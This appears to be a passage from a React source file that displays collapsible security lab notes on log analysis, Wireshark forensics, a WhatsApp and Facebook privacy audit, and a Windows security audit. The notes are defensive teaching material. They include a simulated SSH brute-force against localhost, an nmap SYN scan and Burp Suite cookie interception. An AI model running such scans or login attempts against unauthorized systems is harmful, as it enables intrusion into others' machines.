Step 9: Analyze:
  - File system structure
  - Deleted files
  - Logs
  - evidence.txt

Result: Forensic image created with hash verification. Evidence identified without modifying original data.`,
  },
  {
    id: "loganalysis",
    title: "Log File Analysis",
    content: `Tools: Kali Linux, journalctl, grep, awk, sort

Step 1:  cd /var/log && ls
Step 2:  last                              # successful logins
Step 3:  journalctl | less                 # system logs
Step 4:  journalctl | grep "Failed"        # failed logins
Step 5:  journalctl | grep ssh             # SSH activity
Step 6:  journalctl | grep -i error        # errors
Step 7:  cd /var/log/apache2 && sudo less access.log
Step 8:  grep "404" /var/log/apache2/access.log   # suspicious requests
Step 9:  less /var/log/dpkg.log            # package activity
Step 10: sudo journalctl -f               # real-time monitoring

Simulating Brute Force Attack:
  sudo apt install openssh-server -y
  sudo service ssh start
  ip a                                    # get IP
  ssh fakeuser@localhost                  # wrong password x times

Detect & Analyze:
  journalctl | grep "Failed password"
  journalctl | grep "Failed password" | awk '{print $11}'
  journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
  sudo lastb

Patterns:
  Same IP repeated   → Suspicious
  Unknown IP         → Potential attack
  High frequency     → Brute force`,
  },
  {
    id: "wireshark",
    title: "Network Forensics with Wireshark",
    content: `Step 1:  wireshark &
Step 2:  Select interface: eth0 or wlan0 → Start capture
Step 3:  Protocol filters: tcp | udp | http
Step 4:  Filter by IP: ip.addr == 192.168.0.161
Step 5:  Filter by source: ip.src == 192.168.0.161
Step 6:  Follow TCP Stream → right-click any TCP packet
         Red: data from device A | Blue: data from device B

TCP Flags:
  SYN → Connection start | ACK → Acknowledgement
  PSH → Data transfer   | FIN → Connection close

Detect Port Scanning:
  nmap -sS <target_IP>
  Wireshark filter: tcp.flags.syn == 1 && tcp.flags.ack == 0
  → Multiple SYN packets, different ports = port scan detected

Statistics Menu:
  Capture File Properties → traffic overview
  Resolved Addresses      → IP/MAC → names
  Protocol Hierarchy      → protocol breakdown
  Conversations           → device-to-device comms
  Packet Length           → sizes in bytes
  Endpoints               → all devices + traffic
  I/O Graphs              → traffic over time`,
  },
  {
    id: "privacy",
    title: "Privacy Audit & Data Breach",
    content: `Tools: Wireshark, Burp Suite, Kali Linux, Nativefier

Setup WhatsApp Desktop:
  sudo apt update && sudo apt install nodejs npm -y
  sudo npm install -g nativefier
  nativefier https://web.whatsapp.com
  cd WhatsAppWeb-linux-x64 && ./WhatsAppWeb
  Scan QR code → Login

PART 1: WhatsApp Privacy Audit
  Step 3: Exodus Privacy → https://reports.exodus-privacy.eu.org
          Search WhatsApp → Trackers: Google Analytics, Crashlytics, Facebook Analytics
  Step 4: Start Wireshark → eth0/wlan0 → Start Capture
  Step 5: Send messages/images in WhatsApp
  Step 6: Filters: tls | dns
          Findings: Traffic encrypted (TLS) | Domains: whatsapp.net, facebook.com
          Message content NOT visible → End-to-End Encryption ✓

PART 2: Facebook Privacy Audit
  Step 1: Open https://www.facebook.com → Login
  Step 2: Start Burp Suite → burpsuite
  Step 3: Browser proxy → 127.0.0.1:8080
  Step 4: Intercept ON → reload → observe cookies (datr, fr), session IDs
  Step 5: F12 → Network → ads, analytics scripts, third-party requests

PART 3: Data Breach Case Studies
  Case 1 — Facebook Breach: 533M users | Leaked: phone, email | Cause: API vulnerability
  Case 2 — WhatsApp Pegasus: Spyware via missed call | Remote device access
  Check your email: https://haveibeenpwned.com`,
  },
  {
    id: "security-audit",
    title: "Security Audit & Risk Assessment",
    content: `Step 1:  System Info → Windows + R → msinfo32
Step 2:  Windows Update → Settings → Check for updates
Step 3:  Firewall → Windows Defender Firewall → Turn on/off
Step 4:  Antivirus → Windows Security → Virus & Threat Protection
         Check: Real-time protection ON | Last scan recent
Step 5:  Password → Settings → Accounts → Sign-in options
         Check: Password/PIN enabled | Windows Hello optional
Step 6:  Apps → Settings → Apps → Installed apps
         Look for: unknown software, cracked tools
Step 7:  Startup → Ctrl+Shift+Esc → Startup tab → Disable unknown apps
Step 8:  Network → Settings → Network & Internet
         Check: WiFi | Network type: Private preferred
Step 9:  Browser → Settings → Privacy & Security
         Check: Safe browsing ON | Remove unknown extensions
Step 10: Backup → Search "Backup settings" → Check OneDrive/External

Risk Assessment:
  Asset           | Threat              | Risk   | Solution
  Personal Files  | Data Loss/No Backup | High   | Enable OneDrive
  System          | Malware/Unknown App | High   | Remove apps
  Network         | Hacking/Public Net  | Medium | Use Private
  Account         | Weak Password       | High   | Strong password

Recommendations:
  Technical:      Enable firewall, antivirus, regular updates
  Administrative: Strong passwords, avoid unknown downloads
  Awareness:      Avoid phishing links, safe browsing`,
  },
];

function Section({ section, idx }) {
  const [open, setOpen] = useState(false);
  return (
    <div style={{ borderBottom: "1px solid #e0e0e0", padding: "8px 0" }}>
      <div
        onClick={() => setOpen((o) => !o)}
        style={{
          cursor: "pointer",
          display: "flex",
          gap: "12px",
          alignItems: "center",
          padding: "4px 0",
        }}
      >
        <span style={{ fontFamily: "monospace", fontSize: "13px", color: "#888" }}>
          {String(idx + 1).padStart(2, "0")}
        </span>
        <span style={{ fontFamily: "monospace", fontSize: "15px", color: "#000" }}>
          {section.title}
        </span>
        <span style={{ marginLeft: "auto", fontFamily: "monospace", fontSize: "13px", color: "#000" }}>
          {open ? "−" : "+"}
        </span>
      </div>
      {open && (
        <pre
          style={{
            marginTop: "10px",
            fontFamily: "monospace",
            fontSize: "13px",
            lineHeight: "1.7",
            whiteSpace: "pre-wrap",
            wordBreak: "break-word",
            background: "#f7f7f7",
            color: "#000",
            padding: "16px",
            border: "1px solid #e0e0e0",
            borderRadius: "4px",
            textAlign: "left",
          }}
        >
          {section.content}
        </pre>
      )}
    </div>
  );
}

export default function App() {
  const [tab, setTab] = useState("cc");

  const tabStyle = (active) => ({
    padding: "8px 24px",
    fontFamily: "monospace",
    fontSize: "14px",
    cursor: "pointer",
    border: "1px solid #ccc",
    borderBottom: active ? "1px solid #fff" : "1px solid #ccc",
    borderRadius: "4px 4px 0 0",
    marginBottom: "-1px",
    background: active ? "#fff" : "#f0f0f0",
    color: "#000",
    fontWeight: active ? "bold" : "normal",
  });

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#fff",
        color: "#000",
      }}
    >
      <div
        style={{
          maxWidth: "860px",
          margin: "0 auto",
          padding: "32px 24px 80px",
          fontFamily: "monospace",
          background: "#fff",
          color: "#000",
          textAlign: "left",
        }}
      >
        {/* Tabs */}
        <div
          style={{
            display: "flex",
            gap: "4px",
            borderBottom: "1px solid #ccc",
            marginBottom: "32px",
          }}
        >
          <button style={tabStyle(tab === "cc")} onClick={() => setTab("cc")}>
            CC
          </button>
          <button style={tabStyle(tab === "cs")} onClick={() => setTab("cs")}>
            CS
          </button>
        </div>

        {tab === "cc" && (
          <div>
            <h2
              style={{
                fontFamily: "monospace",
                fontSize: "28px",
                marginBottom: "24px",
                color: "#000",
                textAlign: "left",
              }}
            >
              CC
            </h2>
            {CC_SECTIONS.map((s, i) => (
              <Section key={s.id} section={s} idx={i} />
            ))}
          </div>
        )}

        {tab === "cs" && (
          <div>
            <h2
              style={{
                fontFamily: "monospace",
                fontSize: "28px",
                marginBottom: "24px",
                color: "#000",
                textAlign: "left",
              }}
            >
              CS
            </h2>
            {CS_SECTIONS.map((s, i) => (
              <Section key={s.id} section={s} idx={i} />
            ))}
          </div>
        )}
      </div>
    </div>
  );
}